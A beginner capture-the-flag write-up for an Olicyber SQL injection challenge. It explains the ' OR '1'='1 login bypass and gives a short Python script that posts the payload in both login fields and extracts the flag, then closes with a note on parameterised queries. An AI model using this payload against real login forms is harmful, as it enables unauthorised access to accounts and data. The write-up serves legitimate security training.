---
title: "Basic SQLi — Classic OR 1=1 Login Bypass"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "sqli", "python"]
difficulty: "beginner"
summary: "Inject ' OR '1'='1 into both username and password fields to make the SQL query always true and grab the flag from the response."
---

## The Challenge

A login form. The backend builds the SQL query by string-concatenating user input without sanitisation.

## Approach

`' OR '1'='1` closes the existing string literal, appends a condition that is always true, and reopens the string. The resulting query returns all rows, satisfying the login check and printing the flag.

## Solution

```python
import requests
site = "http://basic-sqli.challs.olicyber.it/"
r = requests.post(site, data={"username":"' OR '1'='1", "password":"' OR '1'='1"})
print(r.text[r.text.find("flag{"):r.text.find("}")] + "}", end="")
```

Both fields use the payload. The response HTML contains `flag{...}`; `str.find` locates the start and end to extract exactly the flag token.

## What I Learned

OR-based login bypass is the foundation of SQL injection. It works whenever user input is directly interpolated into a `WHERE` clause without parameterised queries or escaping. Sending the payload in both fields avoids situations where only one field is vulnerable.
